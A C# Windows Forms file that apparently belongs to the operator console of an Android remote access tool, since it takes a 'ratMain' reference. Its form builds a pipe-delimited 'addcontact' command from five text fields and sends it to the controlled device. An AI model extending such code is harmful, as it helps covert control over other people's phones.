using System;
using System.Windows.Forms;

namespace AndroidExtension
{
    public partial class AddContact : Form
    {
        #region Variables

        /// <summary>
        /// Class1 reference
        /// </summary>
        Class1 ctx;

        #endregion

        #region UI Functions

        /// <summary>
        /// Constructor
        /// </summary>
        /// <param name="ratMain">Class1 reference</param>
        public AddContact(Class1 ratMain)
        {
            InitializeComponent(); //Load controls
            ctx = ratMain; //Set context
        }

        #pragma warning disable IDE1006
        /// <summary>
        /// Add contact Button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button1_Click(object sender, EventArgs e)
        {
            //Create command for android
            string command = "addcontact|";
            command += textBox1.Text + "|";
            command += textBox2.Text + "|";
            command += textBox3.Text + "|";
            command += textBox4.Text + "|";
            command += textBox5.Text + "|";

            ctx.SendCommand(command); //Send the command to the current device
            MessageBox.Show("Contact added!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            Close(); //Close form
        }

        /// <summary>
        /// Cancel button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button2_Click(object sender, EventArgs e)
        {
            Close(); //Cancel button, close form
        }

        #endregion
    }
}
